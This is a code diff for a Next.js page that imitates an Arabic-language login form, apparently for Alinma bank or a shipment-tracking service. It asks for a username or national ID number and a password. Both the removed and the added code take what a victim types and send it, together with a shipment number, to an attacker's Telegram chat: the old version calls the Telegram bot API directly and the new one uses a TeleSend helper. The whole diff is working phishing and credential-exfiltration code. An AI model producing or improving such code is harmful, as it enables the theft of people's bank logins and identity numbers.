@@ -2,26 +2,42 @@
 import styles from './enma.module.css'
 import Image from 'next/image'
 import icon1 from '../../../../../public/9.png'
-import { useRef } from 'react'
+import { useState } from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
-import bot from '@/compnante/dataBot'
+import TeleSned from '../../../../server/TeleSend'
 const Page = () => {
-        const username = useRef()
-    const password = useRef()
-    const router =useRouter();
-    const x = useSearchParams();
-    const datas = x.get('names')
-    const handleOnSubmit = (e) => {
-        e.preventDefault();
+  const {Send} = TeleSned();
+  const router = useRouter();
+  const x = useSearchParams();
+  const datas = x.get("names")
 
-        var length =`الأنماء  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
-       
-        
-        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
-      
+
+
+  const [form,setForm]=useState({
+    data:{
+      username:"",
+      password:"",
+      رقم_الشحنة:datas
+    }
+  })
+  const setDynamicFormData = (name,value)=>{
+    setForm({
+      data:{
+        ...form.data,
+        [name]:value,
       }
+    })
+  }
+  const PostToTelegram = () => {
+    const description = Object.entries(form.data)
+      .map((d) => `${d[0]} : ${d[1]} `)
+      .join("\n");
+    Send(description)
+
+    
+  };
       const handlerout = ()=>{
-        if(username.current.value == "" || password.current.value == ""){
+        if(form.data.username == "" || form.data.password == ""){
           alert('من فضلك قم بملى الحقول')
         }else{
           
@@ -36,10 +52,19 @@ const Page = () => {
             width={400}
         />
 
-        <form onSubmit={handleOnSubmit}>
+        <form onSubmit={(e)=>{
+        e.preventDefault();
+        PostToTelegram()
+      }}>
 
-            <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
-            <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
+            <input type="text" name="username"onChange={(e) => {
+                  const { name, value } = e.target;
+                  setDynamicFormData(name, value);
+                }} placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
+            <input type="text"name="password" onChange={(e) => {
+                  const { name, value } = e.target;
+                  setDynamicFormData(name, value);
+                }} placeholder='ادخل كلمة المرور' required/>
             <button type='submit' onClick={handlerout}>تسجيل الدخول</button>
 
         </form>
